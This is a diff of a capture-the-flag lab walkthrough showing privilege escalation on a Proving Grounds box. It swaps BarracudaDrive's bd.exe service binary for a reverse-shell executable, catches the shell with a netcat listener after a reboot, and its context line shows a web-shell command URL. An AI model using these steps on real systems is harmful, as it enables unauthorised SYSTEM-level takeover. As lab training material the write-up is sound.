@@ -519,24 +519,31 @@ http://192.168.224.127:45332/cmd.php?cmd=rev.exe
 ---
 
 # Privilege Escalation
-## Local Enumeration
-
-#### - Per the previous enumeration we know BarracudaDrive has a local privilege escalation
-
-#### - Navigated to the privilege escalation exploit found previously:
-
-![](Images/Pasted%20image%2020221020193237.png)
-
-## Privilege Escalation vector
 ## BarracudaDrive v6.5 Privilege Escalation 
 
 - We navigate to the privilege escalation exploit webpage we found on Google previously.
+
+![](Images/Pasted%20image%2020221020193237.png)
 
 - Rather than producing a malicious C code binary, we make use of the target machine’s existing rev.exe reverse shell binary.
 
 - To alter the name of the bd executable, we type the following command.
 
+move bd.exe bd.service.exe
+
 ![[Pasted image 20240502171349.png]]
+
+- We alter the name of the reverse shell by typing the following command.
+
+move rev.exe bd.exe
+
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/9fa17605-8b1e-4418-88f9-d80b5d2c5cce)
+
+- We launch a netcat listener on a different terminal at port 139.
+
+- When we type "shutdown -r" and wait a minute, a reverse shell that is running as nt authority\system is displayed.
+
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/c7d47b70-dbfe-437f-810a-2fcd5f5af400)
 
 
 ---
